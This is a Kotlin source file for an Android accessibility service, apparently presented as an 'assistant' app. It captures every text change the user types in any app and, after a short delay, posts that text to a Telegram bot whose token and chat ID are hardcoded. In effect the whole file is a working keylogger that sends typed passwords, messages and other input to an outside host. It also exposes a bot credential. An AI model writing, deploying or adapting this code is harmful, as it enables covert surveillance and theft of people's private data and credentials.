package com.example.assistant_hb

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.os.Handler
import android.os.Looper
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class MyAccessibilityService : AccessibilityService() {

    private val handler = Handler(Looper.getMainLooper())
    private var lastText = ""
    private val debounceRunnable = Runnable { sendToTelegram(lastText) }
    private val client = OkHttpClient()

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val text = event.text.toString()
            if (text.isNotEmpty() && text != lastText) {
                lastText = text
                handler.removeCallbacks(debounceRunnable)
                handler.postDelayed(debounceRunnable, 1000)
            }
        }
    }

    private fun sendToTelegram(text: String) {
        val json = """{"chat_id": "8416456484", "text": "$text"}"""
        val request = Request.Builder()
            .url("https://api.telegram.org/bot8264908770:AAEeWPB0hZkTPCqtjpodUn53Yhc2O3sn5ko/sendMessage")
            .post(json.toRequestBody("application/json; charset=utf-8".toMediaType()))
            .build()

        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onFailure(call: okhttp3.Call, e: IOException) {
                e.printStackTrace()
            }

            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
                // Handle success
            }
        })
    }

    override fun onInterrupt() {
        // Interrupt the service here
    }
}
